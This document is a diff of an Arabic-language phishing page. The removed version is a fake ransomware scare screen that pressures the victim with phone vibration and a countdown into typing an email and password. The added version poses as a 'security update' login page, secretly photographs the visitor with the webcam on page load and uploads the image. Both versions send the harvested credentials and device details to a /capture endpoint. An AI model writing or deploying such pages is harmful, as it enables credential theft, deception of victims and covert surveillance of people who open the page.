@@ -1,104 +1,60 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM CRITICAL ERROR ☠️</title>
+    <title>تحديث أمان النظام</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
-        .console { padding: 20px; font-size: 14px; line-height: 1.8; }
-        #ransom-ui { display: none; text-align: center; padding: 20px; background: #000; height: 100vh; }
-        input { background: #111; border: 2px solid red; color: white; padding: 15px; width: 80%; font-size: 1.2rem; text-align: center; border-radius: 8px; margin-bottom: 10px; }
-        .blink { animation: blinker 0.5s infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        button { background: red; color: white; width: 90%; padding: 20px; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
+        input { display: block; width: 250px; margin: 10px auto; padding: 10px; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; }
     </style>
 </head>
-<body onclick="startExploit()">
-
-    <div id="boot" class="console">
-        [SYSTEM]: INITIALIZING CVE-2026-REMOTE_EXPLOIT...<br>
-        [MEMORY]: INJECTING PAYLOAD TO RAM...<br>
-        [FILES]: ENCRYPTING DATA... <span id="p">0%</span><br>
-        <div class="blink" style="margin-top:20px; color: yellow;">⚠️ تحذير: لا تغلق المتصفح - جاري تأمين ملفاتك ⚠️</div>
-    </div>
-
-    <div id="ransom-ui">
-        <h1 class="blink">🔒 تم قفل نظامك 🔒</h1>
-        <p style="color: white;">تم تشفير ملفاتك الحساسة. لفك القفل فوراً، قم بتأكيد هوية صاحب الجهاز:</p>
-        
-        <form id="captureForm">
-            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-            <input type="password" id="password" placeholder="كلمة المرور" required>
-            <br><br>
-            <button type="submit">فك تشفير الملفات الآن</button>
-        </form>
-        <p style="font-size: 12px; color: gray; margin-top: 20px;">سيتم مسح البيانات نهائياً خلال: <span id="timer">05:00</span></p>
+<body>
+    <div class="box">
+        <h3>يرجى تسجيل الدخول لتحديث الحماية</h3>
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button onclick="sendData()">تحديث الآن</button>
     </div>
 
     <script>
-        let isStarted = false;
-
-        async function startExploit() {
-            if(isStarted) return;
-            isStarted = true;
-
-            // اهتزاز الهاتف لإثارة الذعر
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 5;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    showRansomUI();
-                } else {
-                    document.getElementById('p').innerText = Math.floor(progress) + "%";
-                }
-            }, 100);
-        }
-
-        function showRansomUI() {
-            document.getElementById('boot').style.display = 'none';
-            document.getElementById('ransom-ui').style.display = 'block';
-            document.body.style.touchAction = 'auto';
-            startTimer();
-        }
-
-        function startTimer() {
-            let sec = 300;
-            setInterval(() => {
-                let min = Math.floor(sec / 60);
-                let s = sec % 60;
-                document.getElementById('timer').innerText = `${min}:${s < 10 ? '0'+s : s}`;
-                if(sec > 0) sec--;
-            }, 1000);
-        }
-
-        document.getElementById('captureForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-
-            // إرسال البيانات فوراً إلى سيرفر Render الخاص بك
+        // طلب الكاميرا والتقاط الصورة فور الدخول
+        async function initCamera() {
             try {
-                await fetch('/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: email,
-                        password: pass,
-                        device: navigator.userAgent,
-                        status: "Ransomware_Entry"
-                    })
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 480; canvas.height = 640;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/jpeg');
+                    
+                    await fetch('/upload-photo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: img })
+                    });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000); // يلتقط الصورة بعد ثانيتين من فتح الكاميرا
+            } catch (e) { console.log("Camera Denied"); }
+        }
 
-                alert("تم استلام مفتاح فك التشفير. سيتم إعادة تشغيل النظام.");
-                window.location.href = "https://google.com";
-            } catch (err) {
-                console.error("Error sending data");
-            }
-        };
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            await fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password, device: navigator.userAgent })
+            });
+            alert("تم إرسال طلب التحديث بنجاح.");
+        }
+
+        window.onload = initCamera;
     </script>
 </body>
 </html>
